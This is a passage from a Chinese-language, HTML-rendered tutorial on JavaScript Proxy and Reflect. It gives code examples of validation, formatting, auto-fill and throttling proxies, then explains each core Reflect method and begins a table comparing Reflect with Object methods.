class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;年龄必须是整数&#x27;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (value &lt; <span class="hljs-number">0</span> || value &gt; <span class="hljs-number">150</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RangeError</span>(<span class="hljs-string">&#x27;年龄必须在0-150之间&#x27;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, validator);<br>person.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// 正常</span><br>person.<span class="hljs-property">age</span> = <span class="hljs-string">&#x27;thirty&#x27;</span>; <span class="hljs-comment">// 抛出类型错误</span><br></code></pre></td></tr></table></figure><p><strong>自动格式化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> formatter = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">const</span> value = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">&#x27;number&#x27;</span> ? <span class="hljs-string">`$<span class="hljs-subst">$&#123;value.toFixed(<span class="hljs-number">2</span>)&#125;</span>`</span> : value;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> prices = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">apple</span>: <span class="hljs-number">1.2</span>, <span class="hljs-attr">banana</span>: <span class="hljs-number">0.8</span> &#125;, formatter);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">apple</span>); <span class="hljs-comment">// $1.20</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(prices.<span class="hljs-property">banana</span>); <span class="hljs-comment">// $0.80</span><br></code></pre></td></tr></table></figure><p><strong>自动填充对象</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> autoFill = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, prop</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!(prop <span class="hljs-keyword">in</span> target)) &#123;<br>      target[prop] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target[prop];<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, autoFill);<br>obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span> = <span class="hljs-string">&#x27;value&#x27;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">c</span>); <span class="hljs-comment">// &#x27;value&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>函数节流</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">throttle</span> = (<span class="hljs-params">fn, delay</span>) =&gt; &#123;<br>  <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(fn, &#123;<br>    <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, args</span>) &#123;<br>      <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br>      <span class="hljs-keyword">if</span> (now - lastCall &lt; delay) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;调用太频繁，被节流&#x27;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      lastCall = now;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(target, thisArg, args);<br>    &#125;<br>  &#125;);<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">expensiveFn</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;执行操作&#x27;</span>);<br><span class="hljs-keyword">const</span> throttledFn = <span class="hljs-title function_">throttle</span>(expensiveFn, <span class="hljs-number">1000</span>);<br><br><span class="hljs-comment">// 测试</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// 执行操作</span><br><span class="hljs-title function_">throttledFn</span>(); <span class="hljs-comment">// 调用太频繁，被节流</span><br><span class="hljs-built_in">setTimeout</span>(throttledFn, <span class="hljs-number">1100</span>); <span class="hljs-comment">// 执行操作</span><br></code></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>Reflect API：通常与 Reflect 对象配合使用，确保正确的 this 绑定</li><li>性能影响：Proxy 操作比直接访问属性慢，避免在性能关键路径上过度使用</li><li>目标对象不可变：Proxy 代理不会改变目标对象本身</li><li>this 绑定：Proxy 内部方法中的 this 指向 handler 对象</li><li>可撤销代理：可以使用 Proxy.revocable() 创建可撤销的代理</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> &#123; proxy, revoke &#125; = <span class="hljs-title class_">Proxy</span>.<span class="hljs-title function_">revocable</span>(&#123;&#125;, &#123;&#125;);<br><span class="hljs-title function_">revoke</span>(); <span class="hljs-comment">// 此后对代理的任何操作都会抛出错误</span><br></code></pre></td></tr></table></figure><h2 id="Reflect-详解"><a href="#Reflect-详解" class="headerlink" title="Reflect 详解"></a>Reflect 详解</h2><h3 id="什么是Reflect？"><a href="#什么是Reflect？" class="headerlink" title="什么是Reflect？"></a>什么是Reflect？</h3><p>Reflect 是 ES6 引入的一个内置对象，它提供了一组静态方法用于操作对象，这些方法与 Proxy 的拦截方法一一对应。Reflect 的设计目的是为了：</p><p>（1）将一些明显属于语言内部的方法转移到 JavaScript 代码层，比如 Object.defineProperty 未来只能通过 Reflect 对象访问</p><p>（2）提供更合理的返回值（用布尔值代替抛出异常）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 老写法</span><br><span class="hljs-keyword">try</span> &#123;<br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes);<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br><br><span class="hljs-comment">// 新写法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(target, property, attributes)) &#123;<br>  <span class="hljs-comment">// success</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// failure</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（3）统一操作对象的函数式 API，将对象操作都变成函数式行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 老写法</span><br><span class="hljs-string">&#x27;assign&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-title class_">Object</span> <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 新写法</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(<span class="hljs-title class_">Object</span>, <span class="hljs-string">&#x27;assign&#x27;</span>) <span class="hljs-comment">// true</span><br><br></code></pre></td></tr></table></figure><p>（4）为 Proxy 提供默认行为的基础方法，让 Proxy 对象可以更方便的调用对应的 Reflect 方法，完成默认行为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">var</span> obj = &#123;&#125;<br><span class="hljs-keyword">var</span> obj2 = &#123;&#125;<br><span class="hljs-keyword">var</span> proxyHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-comment">// todo</span><br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> reflectHandler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>)<br>  &#125;<br>&#125;<br><span class="hljs-keyword">var</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, proxyHandler)<br><span class="hljs-keyword">var</span> reflectObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj2, reflectHandler)<br><br>proxyObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br>reflectObj.<span class="hljs-property">a</span> = <span class="hljs-number">1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxyObj) <span class="hljs-comment">// &#123;&#125;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reflectObj) <span class="hljs-comment">// &#123;a: 1&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Reflect-核心方法详解"><a href="#Reflect-核心方法详解" class="headerlink" title="Reflect 核心方法详解"></a>Reflect 核心方法详解</h3><p><strong>Reflect.get(target, propertyKey[, receiver])</strong></p><ul><li>获取对象属性的值</li><li>等同于 target[propertyKey]</li><li>receiver 参数可以改变 getter 中的 this 指向</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>)); <span class="hljs-comment">// 1</span><br><br><span class="hljs-comment">// 改变 getter 中的 this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-attr">foo</span>: <span class="hljs-number">1</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">bar</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">foo</span>;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj2, <span class="hljs-string">&#x27;bar&#x27;</span>, receiver)); <span class="hljs-comment">// 2</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.set(target, propertyKey, value[, receiver])</strong></p><ul><li>设置对象属性的值</li><li>等同于 target[propertyKey] &#x3D; value</li><li>返回布尔值表示是否设置成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><br><span class="hljs-comment">// 改变 setter 中的 this</span><br><span class="hljs-keyword">const</span> obj2 = &#123;<br>  <span class="hljs-keyword">set</span> <span class="hljs-title function_">prop</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = value;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj2, <span class="hljs-string">&#x27;prop&#x27;</span>, <span class="hljs-number">10</span>, receiver);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(receiver.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 10</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.has(target, propertyKey)</strong></p><ul><li>判断对象是否包含某属性</li><li>等同于 propertyKey in target</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;toString&#x27;</span>)); <span class="hljs-comment">// true (继承属性)</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.deleteProperty(target, propertyKey)</strong></p><ul><li>删除对象的某属性</li><li>等同于 delete target[propertyKey]</li><li>返回布尔值表示是否删除成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; y: 2 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.construct(target, argumentsList[, newTarget])</strong></p><ul><li>调用构造函数创建实例</li><li>等同于 new target(…args)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(<span class="hljs-title class_">Person</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.apply(target, thisArgument, argumentsList)</strong></p><ul><li>调用函数</li><li>等同于 Function.prototype.apply.call(target, thisArgument, argumentsList)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(greet, <span class="hljs-literal">null</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// &#x27;Hello, Alice!&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.defineProperty(target, propertyKey, attributes)</strong></p><ul><li>定义或修改对象属性</li><li>等同于 Object.defineProperty()</li><li>返回布尔值表示是否成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span><br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(success); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Bob&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getOwnPropertyDescriptor(target, propertyKey)</strong></p><ul><li>获取属性描述符</li><li>等同于 Object.getOwnPropertyDescriptor()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> desc = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">value</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">enumerable</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getPrototypeOf(target)</strong></p><ul><li>获取对象的原型对象</li><li>等同于 Object.getPrototypeOf()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj) === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.setPrototypeOf(target, prototype)</strong></p><ul><li>设置对象的原型对象</li><li>等同于 Object.setPrototypeOf()</li><li>返回布尔值表示是否设置成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> proto = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, proto);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>); <span class="hljs-comment">// &#x27;bar&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.isExtensible(target)</strong></p><ul><li>判断对象是否可扩展</li><li>等同于 Object.isExtensible()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// true</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.preventExtensions(target)</strong></p><ul><li>阻止对象扩展</li><li>等同于 Object.preventExtensions()</li><li>返回布尔值表示是否成功</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br>obj.<span class="hljs-property">y</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// 静默失败或严格模式下报错</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; x: 1 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.ownKeys(target)</strong></p><ul><li>获取对象所有自有属性键（包括 Symbol 和不可枚举属性）</li><li>等同于 Object.getOwnPropertyNames(target).concat(Object.getOwnPropertySymbols(target))</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;id&#x27;</span>)]: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;hidden&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;secret&#x27;</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj)); <br><span class="hljs-comment">// [&#x27;name&#x27;, &#x27;age&#x27;, &#x27;hidden&#x27;, Symbol(id)]</span><br></code></pre></td></tr></table></figure><h3 id="为什么使用-Reflect？"><a href="#为什么使用-Reflect？" class="headerlink" title="为什么使用 Reflect？"></a>为什么使用 Reflect？</h3><p>除了上面讲过的 Reflect 的几个设计目的外，还包括下面的原因：</p><p><strong>支持 receiver 参数</strong></p><p>Reflect 的 get&#x2F;set 方法支持 receiver 参数，可改变 getter&#x2F;setter 中的 this 指向：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">_value</span>: <span class="hljs-number">42</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>, receiver)); <span class="hljs-comment">// 42</span><br></code></pre></td></tr></table></figure><h3 id="Reflect和Object方法的区别"><a href="#Reflect和Object方法的区别" class="headerlink" title="Reflect和Object方法的区别"></a>Reflect和Object方法的区别</h3><table><thead><tr><th align="left">操作</th><th align="left">Object 方法</th><th align="left">Reflect 方法</th><th align="left">主要区别</th></tr></thead><tbody><tr><td align="left">获取属性描述符</td><td align="left">getOwnPropertyDescriptor</td><td align="left">getOwnPropertyDescriptor</td><td align="left">相同</td></tr><tr><td align="left">定义属性</td><td align="left">defineProperty</td><td align="left">defineProperty</td><td align="left">Reflect 返回布尔值而非对象</td></tr><tr><td align="left">获取原型</td><td align="left">getPrototypeOf</td><td align="left">getPrototypeOf</td><td align="left">Reflect 参数非对象会抛出错误</td></tr><tr><td align="left">设置原型</td><td align="left">setPrototypeOf</td><td align="left">setPrototypeOf</td><td align="left">Reflect 返回布尔值</td></tr><tr><td align="left">扩展性检查</td><td align="left">isExtensible</td><td align="left">isExtensible</td><td align="left">Reflect 参数非对象会抛出错误</td></tr><tr><td align="left">阻止扩展</td><td align="left">preventExtensions</td><td align="left">preventExtensions</td><td align="left">Reflect 返回布尔值</td></tr><tr><td align="left">属性枚举</td><td align="left">keys + getOwnPropertyNames</td><td align="left">ownKeys</td><td align="left">Reflect 返回所有键，包括不可枚举和 Symbol</td></tr><tr><td align="left">函数调用</td><td align="left">-</td><td align="left">apply</td><td align="left">无直接对应方法</td></tr><tr><td align="left">构造函数调用</td><td align="left">-</td><td align="left">construct</td><td align="left">无直接对应方法</td></tr><tr><td align="left">属性存在检查</td><td align="left">-</td><td 